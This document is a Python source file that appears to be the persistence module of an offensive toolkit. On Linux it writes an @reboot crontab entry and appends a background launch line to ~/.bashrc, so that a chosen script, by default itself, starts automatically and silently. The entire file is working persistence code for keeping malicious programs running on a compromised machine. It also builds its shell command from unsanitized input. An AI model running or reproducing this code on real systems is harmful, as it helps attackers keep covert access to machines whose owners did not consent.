#!/usr/bin/env python3
# Persistence Module

import os
import platform
from core.colors import Colors

class PersistenceModule:
    def __init__(self):
        self.name = "Persistence Module"
    
    def run(self):
        print(f"\n{Colors.CYAN}[*] {self.name}{Colors.END}")
        script = input(f"{Colors.GREEN}Script path > {Colors.END}") or __file__
        
        system = platform.system()
        
        if system == "Linux":
            # Crontab
            cron_line = f"@reboot python3 {script} &\n"
            os.system(f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -')
            # Bashrc
            with open(os.path.expanduser("~/.bashrc"), 'a') as f:
                f.write(f"\npython3 {script} &\n")
            print(f"{Colors.GREEN}[+] Persistence installed (cron + bashrc){Colors.END}")
        else:
            print(f"{Colors.YELLOW}[!] Persistence for {system} coming soon{Colors.END}")
